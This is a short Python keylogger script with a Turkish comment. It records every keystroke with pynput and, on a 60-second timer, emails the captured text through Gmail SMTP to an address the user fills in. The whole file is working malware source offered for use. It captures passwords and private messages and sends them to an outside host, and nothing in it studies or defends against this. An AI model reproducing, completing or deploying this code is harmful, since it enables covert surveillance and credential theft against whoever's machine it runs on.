#!/usr/bin/env python
# -*- coding: utf-8 -*-

import pynput.keyboard
import smtplib
import threading

reg = ""

def key_holder(k):
    global reg
    try:
        #key içindeki sadece karakteri(char) getir. Türkçe karakterlerde dahil
        reg = reg + k.char.encode("utf-8")
    except AttributeError:
        if k == k.space:
            reg = reg + " "
        else:
            reg = reg + str(k)

def sender(mail, psw, msg):
    s = smtplib.SMTP("smtp.gmail.com",587)
    s.starttls()
    s.login(mail, psw)
    s.sendmail(mail, mail, msg)
    s.quit()

def mailler():
     global reg
     sender("your_email_address", "your_email_address_password", "Keys-- (" + reg + ") --Keys")
     reg = ""
     thread = threading.Timer(60, mailler)
     thread.start()

key_listen = pynput.keyboard.Listener(on_press = key_holder)

with key_listen:
    mailler()
    key_listen.join()
